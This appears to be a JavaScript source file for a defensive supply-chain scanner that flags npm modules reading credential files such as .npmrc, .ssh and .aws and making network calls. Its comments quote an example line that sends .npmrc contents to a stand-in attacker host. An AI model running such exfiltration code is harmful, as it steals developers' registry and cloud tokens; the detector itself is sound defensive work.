// packages/fw-agent/src/behavior-tracker.js
// Behavioral analyzer for sequence-based threat detection.
// Tracks dangerous action sequences within a single module.

// Signal detection patterns for each behavioral category
const SIGNAL_PATTERNS = {
  // Reads sensitive credential files (fs-based). process.env is tracked separately
  // via ENV_READ to avoid false-positive CREDENTIAL_EXFILTRATION on normal HTTP libraries.
  SENSITIVE_READ: [
    /fs\s*\.\s*readFile/,
    /fs\s*\.\s*readFileSync/,
    /fs\s*\.\s*open(?:Sync)?\s*\(/,
  ],
  // Bare environment variable access — common in normal apps; escalates to WARN only
  // unless a SENSITIVE_PATH is also present (genuine credential file access).
  ENV_READ: [
    /process\s*\.\s*env\b/,
  ],
  SENSITIVE_PATH: [
    // Match .env only as a file-path reference (preceded by quote, slash, or backtick),
    // not as a property access like `process.env.FOO` (F-16 false-positive fix).
    /['"\/`]\.env\b/i,
    /[\/\\][\w.\-]{0,40}credentials/i,
    /[\/\\]\.ssh\b/,
    /id_rsa/,
    /[\/\\]\.netrc/,
    /[\/\\]\.aws\b/,
    /[\/\\][\w.\-]{0,40}secret/i,
    /[\/\\][\w.\-]{0,40}passwd/i,
    /[\/\\][\w.\-]{0,40}shadow/i,
  ],
  // .npmrc is its own (weaker) signal, not a SENSITIVE_PATH (F-30 redo): every npm client,
  // installer, and publish tool legitimately reads .npmrc to resolve the registry URL, so
  // bare "reads .npmrc + makes a network call" is not evidence of anything by itself. It only
  // becomes a credential-theft signal combined with an actual token-field reference, an
  // explicit host override, or a hardcoded exfil destination below -- see the escalation rule
  // in analyzeModule(). NOTE: the first cut of F-30 gated escalation solely on the literal
  // string `_authToken` appearing in the module, which missed the more common real attack --
  // reading the whole file and shipping it without ever naming the field
  // (`fetch('http://evil.example/c?d='+fs.readFileSync('.npmrc'))`). The discriminator that
  // actually holds is WHERE the data goes, not whether a field name is parsed out of it.
  NPMRC_READ: [
    /\.npmrc/i,
  ],
  // The npm auth token/password fields in a real .npmrc, e.g.
  // `//registry.npmjs.org/:_authToken=...` or `_auth=...` -- these are the actual secret,
  // as opposed to the plain `registry=` config line every package manager reads.
  NPMRC_TOKEN: [
    /_authToken/i,
    /_auth\b/i,
    /_password\b/i,
    /authToken/i,
  ],
  // Explicit destination override alongside a network call, e.g. https.request({host:
  // 'evil.example', ...}) -- a deliberate redirect, not the ambiguous case a bare hardcoded
  // URL literal can be (see HARDCODED_EGRESS_CALL).
  HOST_OPTION: [
    /host\s*:\s*['"`][^'"`]+/,
  ],
  // Makes outbound network connections
  NETWORK_EGRESS: [
    /http\s*\.\s*request\s*\(/,
    /https\s*\.\s*request\s*\(/,
    /http\s*\.\s*get\s*\(/,
    /https\s*\.\s*get\s*\(/,
    /\bfetch\s*\(/,
    /net\s*\.\s*connect\s*\(/,
    /net\s*\.\s*createConnection\s*\(/,
    /socket\s*\.\s*connect\s*\(/,
    /new\s+WebSocket\s*\(/,
    /XMLHttpRequest/,
    /tls\s*\.\s*connect\s*\(/,
    /dgram\s*\.\s*createSocket/,
    // Inline require("https").get/request — not caught by the patterns above
    /require\s*\(\s*['"]https?['"]\s*\)\s*\.\s*(?:get|request)\s*\(/,
  ],
  // Generates or evaluates code at runtime
  DYNAMIC_CODE: [
    /\beval\s*\(/,
    /new\s+Function\s*\(/,
    /\bFunction\s*\(\s*['"`]/,
    /vm\s*\.\s*runIn(?:This|New|)Context\s*\(/,
    /vm\s*\.\s*Script\s*\(/,
    /\bsetTimeout\s*\(\s*['"`]/,
    /\bsetInterval\s*\(\s*['"`]/,
    /Script\s*\.\s*runInNewContext/,
  ],
  // Executes external processes
  PROCESS_EXEC: [
    /child_process/,
    /\bexecSync\s*\(/,
    /\bspawnSync\s*\(/,
    /\bexecFile\s*\(/,
    /\bexecFileSync\s*\(/,
    /ShellString/,
  ],
  // Loads modules dynamically or via non-literal paths
  DYNAMIC_REQUIRE: [
    /require\s*\.\s*resolve\s*\(/,
    /module\s*\._load\s*\(/,
    /require\s*\(\s*(?!['"`])[^)]+\)/,  // require(variable)
  ],
};

function matchesAny(content, patterns) {
  return patterns.some(p => p.test(content));
}

// A quoted absolute URL passed directly as the argument of an actual network-call site --
// distinguishes theft (hardcodes the destination) from legit npm tooling (builds the URL
// from config, e.g. `fetch(`${registry}/${name}`)`). Anchored to the call site itself (not
// "any quoted URL anywhere in the file") so a legit fallback-default constant sitting next to
// a config-driven fetch -- e.g.
// `const registry = cfg.match(...) ? m[1] : 'https://registry.npmjs.org'` -- does not
// false-positive just because that literal exists somewhere in the module. Matched against
// raw `content`, not `scanSrc`: scanSrc already strips all https?:// literals wholesale (see
// the URL-stripping replace() in analyzeModule()) so a content-based check here would never
// match if run against scanSrc. Kept outside SIGNAL_PATTERNS (and not a matchesAny() boolean
// check) because it needs its capture group -- callers that iterate SIGNAL_PATTERNS expecting
// arrays of boolean-test regexes (e.g. the registry's watch-changes.js evidence reconstruction)
// would break on a single global regex with a capture group.
const HARDCODED_EGRESS_CALL = /(?:https?\s*\.\s*(?:get|request)|fetch|net\s*\.\s*(?:connect|createConnection)|socket\s*\.\s*connect|new\s+WebSocket|tls\s*\.\s*connect|require\s*\(\s*['"]https?['"]\s*\)\s*\.\s*(?:get|request))\s*\(\s*['"`](https?:\/\/[^'"`$\s]+)/g;

class BehaviorTracker {
  constructor() {
    // Per-module signal cache
    this.moduleSignals = new Map();
    // Accumulated violations for telemetry
    this.violations = [];
  }

  /**
   * Analyze a module and return any behavioral violations found.
   * Checks intra-module signal sequences.
   */
  analyzeModule(filename, content) {
    if (!content) return [];

    // SENSITIVE_PATH / SENSITIVE_READ must only fire on genuine filesystem access, not on
    // import/require module specifiers (e.g. "@memberjunction/credentials") or URL paths
    // (e.g. "https://api.example.com/totpSecret"). Blank just the specifier STRING in place
    // (never drop the whole line/statement) so chained calls on the same line survive --
    // e.g. `const s = require('fs').readFileSync('.env')` must keep the '.env' argument
    // visible to SENSITIVE_PATH after the 'fs' specifier is blanked (F-27b regression: the
    // prior line-drop approach deleted this one-line idiom entirely, producing a false
    // negative on the most common credential-theft pattern).
    //
    // Comments come first in the chain (F-28): a path-shaped string mentioned only in
    // prose (e.g. `// src/auth/credentials.ts`) previously survived into scanSrc and, next
    // to any real networkEgress call elsewhere in the module, false-positived
    // CREDENTIAL_EXFILTRATION. Block comments are blanked to a space (preserves token
    // boundaries so adjoining code doesn't fuse); line comments are dropped up to the
    // newline, guarded by a negative lookbehind on ':' so the "//" in "https://" is never
    // mistaken for a comment start and real code following a same-line URL survives.
    const scanSrc = content
      .replace(/\/\*[\s\S]*?\*\//g, ' ')             // block comments
      .replace(/(?<!:)\/\/[^\n]*/g, '')              // line comments
      .replace(/(\brequire\s*\(\s*)(['"`])(?:\\.|(?!\2)[^\\])*\2(\s*\))/g, '$1$2$2$3')  // require('spec')
      .replace(/(\bfrom\s+)(['"`])(?:\\.|(?!\2)[^\\])*\2/g, '$1$2$2')                    // import ... from 'spec'
      .replace(/(\bimport\s*\(\s*)(['"`])(?:\\.|(?!\2)[^\\])*\2(\s*\))/g, '$1$2$2$3')    // import('spec')
      .replace(/https?:\/\/[^\s'"`]+/g, '')          // URLs
      .replace(/`[^`]*\$\{[^`]*`/g, '');             // template-literal URL builders

    // Hardcoded-URL call sites, e.g. fetch('http://evil.example/...'). Extracted (not just
    // matched) so the escalation rule below can tell a hardcoded exfil host apart from a
    // hardcoded reference to the real npm registry (see hardcodedEgressNonRegistry).
    const hardcodedEgressUrls = [];
    for (const m of content.matchAll(HARDCODED_EGRESS_CALL)) {
      hardcodedEgressUrls.push(m[1]);
    }

    const signals = {
      sensitiveRead: matchesAny(scanSrc, SIGNAL_PATTERNS.SENSITIVE_READ),
      sensitivePath: matchesAny(scanSrc, SIGNAL_PATTERNS.SENSITIVE_PATH),
      npmrcRead: matchesAny(scanSrc, SIGNAL_PATTERNS.NPMRC_READ),
      npmrcToken: matchesAny(scanSrc, SIGNAL_PATTERNS.NPMRC_TOKEN),
      hostOption: matchesAny(content, SIGNAL_PATTERNS.HOST_OPTION),
      hardcodedEgress: hardcodedEgressUrls.length > 0,
      hardcodedEgressNonRegistry: hardcodedEgressUrls.some(u => !/^https?:\/\/registry\.npmjs\.org\b/i.test(u)),
      envRead: matchesAny(content, SIGNAL_PATTERNS.ENV_READ),
      networkEgress: matchesAny(content, SIGNAL_PATTERNS.NETWORK_EGRESS),
      dynamicCode: matchesAny(content, SIGNAL_PATTERNS.DYNAMIC_CODE),
      processExec: matchesAny(content, SIGNAL_PATTERNS.PROCESS_EXEC),
      dynamicRequire: matchesAny(content, SIGNAL_PATTERNS.DYNAMIC_REQUIRE),
    };

    this.moduleSignals.set(filename, signals);

    const found = [];

    // Intra-module rule: credential file read OR sensitive path + network egress → CRITICAL exfiltration.
    // Bare process.env reads are intentionally excluded here (F-16: false-positive on axios, dotenv, etc.)
    // and handled by the ENV_NETWORK_EGRESS WARN rule below.
    if (signals.sensitivePath && signals.networkEgress) {
      found.push({
        rule: 'CREDENTIAL_EXFILTRATION',
        severity: 'CRITICAL',
        description: 'Module reads sensitive credentials and makes network calls',
      });
    }

    // Intra-module rule: .npmrc read + network egress. CRITICAL when there's a concrete
    // theft signal -- an actual token/password field reference, an explicit host override, or
    // a hardcoded destination that isn't the real npm registry. A hardcoded call-site URL that
    // IS registry.npmjs.org (some legit tools hardcode it instead of building it from config)
    // is downgraded to WARN rather than blocked, same as the config-built-URL case -- the
    // registry host itself isn't a theft signal, only an unusual one.
    if (signals.npmrcRead && signals.networkEgress) {
      if (signals.npmrcToken || signals.hostOption || signals.hardcodedEgressNonRegistry) {
        found.push({
          rule: 'CREDENTIAL_EXFILTRATION',
          severity: 'CRITICAL',
          description: 'Module reads .npmrc and exfiltrates its contents, an auth token, or redirects to a hardcoded/overridden destination',
        });
      } else {
        found.push({
          rule: 'NPMRC_NETWORK_EGRESS',
          severity: 'WARN',
          description: 'Module reads .npmrc and makes network calls (common in npm tooling; monitor for token extraction or a hardcoded exfil destination)',
        });
      }
    }

    // Intra-module rule: bare env read + network egress → WARN only (common in normal apps).
    // Escalates to CRITICAL only if a sensitive credential path is also detected (handled above).
    if (signals.envRead && signals.networkEgress && !signals.sensitiveRead && !signals.sensitivePath) {
      found.push({
        rule: 'ENV_NETWORK_EGRESS',
        severity: 'WARN',
        description: 'Module reads process.env and makes network calls (common pattern; monitor for credential paths)',
      });
    }

    // Intra-module rule: dynamic code generation + process execution → code injection chain
    if (signals.dynamicCode && signals.processExec) {
      found.push({
        rule: 'DYNAMIC_CODE_EXEC_CHAIN',
        severity: 'CRITICAL',
        description: 'Module generates code dynamically and executes system processes',
      });
    }

    // Standalone rule: dynamic require with non-literal path → module injection risk
    if (signals.dynamicRequire) {
      found.push({
        rule: 'DYNAMIC_MODULE_LOAD',
        severity: 'MEDIUM',
        description: 'Module uses dynamic require() or module._load with a non-literal path',
      });
    }

    if (found.length > 0) {
      this.violations.push({ filename, violations: found, timestamp: Date.now() });
    }

    return found;
  }

  reset() {
    this.moduleSignals.clear();
    this.violations = [];
  }
}

module.exports = { BehaviorTracker };
